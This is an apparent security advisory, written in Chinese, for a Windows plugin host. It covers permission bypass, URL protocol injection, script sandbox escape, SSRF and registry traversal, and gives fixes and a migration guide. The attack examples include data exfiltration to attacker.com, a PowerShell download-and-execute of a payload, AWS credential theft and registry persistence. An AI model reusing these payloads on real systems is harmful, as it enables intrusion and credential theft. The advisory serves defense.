## 详细漏洞分析

### LBW-2026-001: WebView2 权限绕过 🔴

**CVSS 3.1**: 9.3 (Critical)  
**CWE**: CWE-862 (Missing Authorization)

**问题描述**:  
HTML/JS 插件通过 `long.*` JavaScript API 调用宿主能力时，`DispatchJsCall` 方法完全忽略了 `manifest.json` 中声明的 `capabilities` 字段。任何 HTML 插件都可以调用所有 12 项系统能力，包括：
- 注册表读写 (`long.registry.*`)
- NTFS ADS 读写 (`long.fs.ads.*`)
- HTTP 请求 (`long.http.*`)
- 全局热键注册 (`long.hotkey.*`)
- 剪贴板访问 (`long.clipboard.*`)
- 截图 (`long.screenshot.*`)

**攻击场景**:
```html
<!-- 恶意插件 manifest.json 声明无权限 -->
{
  "capabilities": []
}

<!-- 但 index.html 可以调用任何 API -->
<script>
  // 窃取 ADS 数据
  const secret = await long.fs.ads.read('C:\\sensitive\\file.txt', 'password');
  
  // 通过 HTTP 外传
  await long.http.post('https://attacker.com/steal', secret.data);
  
  // 修改注册表持久化
  await long.registry.write('Startup', 'Malware', 'evil.exe');
</script>
```

**修复方案**:
1. 新增 `GetRequiredCapability()` 方法，建立 68 个 JS API 到 capability 的映射表
2. 在 `DispatchJsCall()` 开头检查 `_manifest.Capabilities.Contains(requiredCapability)`
3. 使用 `PluginAccessContext.Enter(_manifest.Id)` 设置当前插件上下文
4. 拒绝未授权调用并返回 `{ success: false, error: "插件未声明权限: xxx" }`
5. 记录安全日志: `Log.Warning("[Web:{Id}] 权限拒绝: {Method} 需要 {Capability}")`

**影响**: 恶意 HTML 插件无法再绕过权限系统。

### LBW-2026-002: URL 协议注入 🔴

**CVSS 3.1**: 8.8 (High)  
**CWE**: CWE-78 (OS Command Injection)

**问题描述**:  
`ShellExecuteService.OpenUrlAsync()` 直接使用 `Process.Start(url)` 打开用户提供的 URL，未验证协议。攻击者可以利用 `file://`, `ms-settings:`, `shell:` 等危险协议执行任意命令或打开系统界面。

**攻击场景**:
```javascript
// 执行本地程序
await long.shell.openUrl("file:///C:/Windows/System32/cmd.exe");

// 打开系统设置修改配置
await long.shell.openUrl("ms-settings:privacy-microphone");

// 访问 Shell 文件夹
await long.shell.openUrl("shell:startup");
```

**修复方案**:
1. 使用 `Uri.TryCreate(url, UriKind.Absolute, out var uri)` 验证 URL 格式
2. 协议白名单: `["http", "https", "mailto"]`
3. 拒绝其他协议并返回错误: `"不支持的协议: {uri.Scheme}。仅允许 http、https、mailto"`
4. 记录可疑尝试: `Log.Warning("拒绝打开不安全的 URL 协议: {Scheme} ({Url})")`

**影响**: 阻止通过 URL 协议注入执行任意命令。

### LBW-2026-003: C# 脚本沙盒逃逸 🔴

**CVSS 3.1**: 9.0 (Critical)  
**CWE**: CWE-94 (Improper Control of Code Generation)

**问题描述**:  
C# 脚本插件通过 Roslyn Scripting 执行，但配置中导入了 `"System"`, `"System.Threading.Tasks"`, `"Serilog"` 等命名空间，脚本可以访问整个 .NET 运行时，包括危险类型如 `System.IO.File`, `System.Diagnostics.Process`, `System.Reflection.Assembly` 等。

**攻击场景**:
```csharp
// plugin.csx
using System.IO;
using System.Diagnostics;
using System.Reflection;

// 绕过宿主 API 直接读取文件
var secrets = File.ReadAllText(@"C:\Users\victim\.aws\credentials");

// 启动进程
Process.Start("calc.exe");
Process.Start("powershell.exe", "-c \"iwr attacker.com/payload | iex\"");

// 加载任意程序集执行恶意代码
var asm = Assembly.Load("MaliciousPayload");
asm.EntryPoint.Invoke(null, null);
```

**修复方案**:
1. 从 `ScriptOptions.WithImports()` 中移除危险命名空间:
   - ❌ 移除: `"System"`, `"Serilog"`
   - ✅ 保留: `"System.Threading.Tasks"`, `"LongBetterWindows.Host.*"`
2. 实现 `RestrictedMetadataReferenceResolver` 类:
   - 阻止加载黑名单命名空间: `System.IO`, `System.Diagnostics`, `System.Reflection`, `System.Net`, `System.Runtime.InteropServices`
   - 白名单机制: 仅允许 `System.Runtime`, `System.Collections`, `System.Linq`, `System.Threading.Tasks`, `LongBetterWindows.Host`
3. 脚本必须通过 `Host` API 访问系统功能

**影响**: 脚本插件无法再绕过宿主 API 直接调用危险类型。

### LBW-2026-004: HTTP SSRF 攻击 🟡

**CVSS 3.1**: 7.5 (High)  
**CWE**: CWE-918 (Server-Side Request Forgery)

**问题描述**:  
`HttpService` 的 `GetAsync`, `PostAsync`, `DownloadAsync` 方法允许请求任意 URL，包括内网地址。攻击者可以利用插件作为代理：
- 攻击内网服务 (Redis, MySQL, 管理面板)
- 访问云平台元数据 API (AWS EC2 IMDS: `http://169.254.169.254/latest/meta-data/`)
- 端口扫描
- DDoS 放大攻击
- 下载超大文件导致内存耗尽

**攻击场景**:
```javascript
// 攻击内网 Redis
await long.http.post("http://192.168.1.100:6379/", "SET key malicious_value");

// 访问 AWS 元数据获取临时凭证
const creds = await long.http.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/");

// 下载 10GB 文件耗尽内存
await long.http.download("http://attacker.com/huge_file.bin");
```

**修复方案**:
1. 新增 `ValidateUrl(string url)` 方法验证 URL 安全性
2. 内网地址黑名单: `localhost`, `127.0.0.1`, `0.0.0.0`, `10.*`, `172.16-31.*`, `192.168.*`, `169.254.*`
3. 协议白名单: 仅允许 `http`, `https`
4. 响应大小限制: 10MB (常量 `MaxResponseSize = 10 * 1024 * 1024`)
5. 使用 `HttpCompletionOption.ResponseHeadersRead` 提前检查 `Content-Length`

**影响**: 防止插件利用 HTTP 服务攻击内网或执行 DDoS。

### LBW-2026-005: 注册表路径遍历 🟡

**CVSS 3.1**: 7.2 (High)  
**CWE**: CWE-22 (Path Traversal)

**问题描述**:  
`RegistryService.ResolveKeyPath()` 使用简单的字符串拼接 `$@"{RootKeyPath}\{key.Trim('\\')}"` 构建完整路径，未验证 `key` 参数。攻击者可以使用 `..` 遍历到任意注册表位置，甚至修改系统关键键值。

**攻击场景**:
```javascript
// 遍历到 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
await long.registry.write(
  "..\\..\\Microsoft\\Windows\\CurrentVersion\\Run",
  "Malware",
  "C:\\evil.exe"
);

// 尝试访问 HKEY_LOCAL_MACHINE
await long.registry.write(
  "..\\..\\..\\..\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies",
  "DisableWindowsDefender",
  "1"
);
```

**修复方案**:
1. 检测 `..` 路径遍历: `if (trimmedKey.Contains("..")) throw new ArgumentException()`
2. 阻止绝对路径: `if (Path.IsPathRooted(trimmedKey) || trimmedKey.StartsWith("HKEY_")) throw`
3. 正则验证字符合法性: `Regex.IsMatch(trimmedKey, @"^[a-zA-Z0-9_\-\\]+$")`
4. 记录可疑访问: `Log.Warning("检测到注册表路径遍历尝试: {Key}")`

**影响**: 插件只能访问 `HKEY_CURRENT_USER\Software\LongBetterWindows\` 下的子键。

### LBW-2026-006: ADS 流名称注入 🟡

**CVSS 3.1**: 6.8 (Medium)  
**CWE**: CWE-20 (Improper Input Validation)

**问题描述**:  
`ADSService.BuildAdsPath()` 直接拼接文件路径和流名称 `$"{filePath}:{name}"`，未验证 `streamName` 参数。恶意流名称可能包含特殊字符如 `\`, `/`, `..` 导致路径遍历或访问非预期位置。

**修复方案**:
1. 验证流名称不包含特殊字符: `:`, `\`, `/`, `..`, `<`, `>`, `|`, `*`, `?`
2. 长度限制: 255 字符 (NTFS 限制)
3. 抛出 `ArgumentException` 并记录警告

**影响**: 防止通过恶意流名称访问非预期的文件系统位置。

### LBW-2026-007: 并发写入数据损坏 🔵

**CVSS 3.1**: 5.3 (Medium)  
**CWE**: CWE-662 (Improper Synchronization)

**问题描述**:  
`StorageService.Save()` 在写锁内执行 `JsonSerializer.Serialize()` 和 `File.WriteAllText()`，导致：
1. 锁持有时间过长，阻塞其他线程
2. 如果序列化失败，数据可能丢失
3. 直接写文件，如果写入中途失败，文件损坏

**修复方案**:
1. 在读锁内完成 JSON 序列化，释放锁后再写文件
2. 使用原子写入模式:
   - 先写临时文件 `_filePath + ".tmp"`
   - 再 `File.Move(tempFile, _filePath, overwrite: true)` 原子替换
3. 添加异常处理和临时文件清理

**影响**: 提升并发性能，防止文件损坏。

### LBW-2026-008: Nullable 引用警告 🔵

**CVSS 3.1**: 2.1 (Low)  
**CWE**: 无

**问题描述**:  
`WebPluginRuntime._webView` 字段在构造函数中未初始化，产生编译器警告 CS8618。

**修复方案**:  
将字段声明为 `WebView2 _webView = null!;` 表示延迟初始化。

## 未修复的已知问题

以下问题计划在后续版本中修复：

### P2 级 (v0.5.0)

1. **插件卸载资源泄漏** (`PluginLoader.cs:61-70`)
   - 问题: 卸载插件时只调用 `GC.Collect()`，不确保释放热键、WebView、线程等资源
   - 建议: 为 `ILongPlugin` 添加 `IDisposable` 接口

2. **COM 对象内存泄漏** (`ShellSelectionService.cs:254-271`)
   - 问题: Shell.Application COM 对象可能未正确释放
   - 建议: 使用 `try-finally` + `Marshal.ReleaseComObject()`

3. **PluginLoadContext 隔离不足** (`PluginLoadContext.cs:18-27`)
   - 问题: `Load` 返回 `null` 会回退到默认上下文，插件可访问宿主所有程序集
   - 建议: 显式白名单程序集，拒绝未授权的加载请求

### P3 级 (长期规划)

4. **插件签名验证机制**
   - 建议: 在 `manifest.json` 中添加 `signature` 和 `publicKey` 字段
   - 加载前验证签名，防止恶意插件伪装

5. **RollbackEngine 覆盖范围有限**
   - 当前仅支持注册表和 ADS 回滚
   - 建议: 扩展到文件操作、热键、上下文菜单等服务

6. **插件间依赖管理**
   - 当前无法声明插件依赖关系和加载顺序
   - 建议: 在 `manifest.json` 中添加 `dependencies` 字段

## 插件开发者迁移指南

### 影响范围

- **HTML/JS 插件**: 必须在 `manifest.json` 中声明 `capabilities`
- **C# 脚本插件**: 不能直接使用 `System.IO` 等危险命名空间
- **DLL 插件**: 无破坏性变更

### HTML/JS 插件迁移步骤

1. 检查插件使用的所有 `long.*` API
2. 在 `manifest.json` 中添加对应的 `capabilities`:

```json
{
  "id": "my-plugin",
  "name": "我的插件",
  "version": "1.0.0",
  "runtime": "webview",
  "entryPoint": "index.html",
  "capabilities": [
    "system.clipboard",
    "fs.ads.access",
    "system.hotkey",
    "system.registry.write",
    "network.http",
    "shell.selection",
    "shell.execute",
    "system.screenshot"
  ]
}
```

### C# 脚本插件迁移步骤

将直接的系统调用替换为宿主 API：

```csharp
// ❌ 旧代码（不再可用）
using System.IO;
var content = File.ReadAllText("C:\\path\\file.txt");
Process.Start("notepad.exe");

// ✅ 新代码（通过宿主 API）
var result = await Host.FileOps.ReadFileAsync("C:\\path\\file.txt");
if (result.IsSuccess)
{
    var content = result.Data;
}

await Host.Process.StartAsync("notepad.exe");
```
